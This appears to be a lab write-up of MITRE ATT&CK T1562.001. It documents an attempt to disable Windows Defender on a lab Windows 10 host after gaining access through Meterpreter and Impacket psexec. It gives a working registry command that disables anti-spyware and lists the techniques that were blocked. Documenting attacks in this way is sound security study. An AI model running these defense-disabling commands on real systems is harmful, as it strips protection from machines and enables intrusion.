# T1562.001 - Impair Defenses: Disable or Modify Tools

## Description
This lab simulates an adversary attempting to disable Windows Defender and other security controls to reduce visibility and facilitate further malicious activity.

**MITRE ATT&CK Technique:** [T1562.001 - Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)

---

## Simulation Parameters

- **Attacker:** Kali Linux (192.168.10.250)
- **Target:** Windows 10 Workstation (192.168.10.9) - Domain: ADPRO
- **Initial Access:** Meterpreter (low privilege user: ADPRO\jcruz)
- **Privilege Escalation:** Impacket `psexec`
- **Objective:** Disable Windows Defender Real-time Protection

---

## Execution Summary

### Step 1: Initial Access
- Gained low-privileged Meterpreter session using `windows/x64/meterpreter/reverse_tcp`
- Attempted `getsystem` and `runas` → Failed due to UAC / protection mechanisms.

### Step 2: Privilege Escalation
- Used **Impacket PsExec** from Kali:
  ```bash
  impacket-psexec ADPRO/Administrator@192.168.10.9

### Successfully obtained high-privileged shell (C:\Windows\system32>).
Successful Actions:
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

Failed / Partially Blocked Actions
taskkill on MsMpEng.exe and SecurityHealthService.exe → Access Denied
Registry change for Tamper Protection → Access Denied
Set-MpPreference -DisableRealtimeMonitoring $true → Blocked / No effect
Final check: DisableRealtimeMonitoring remained False



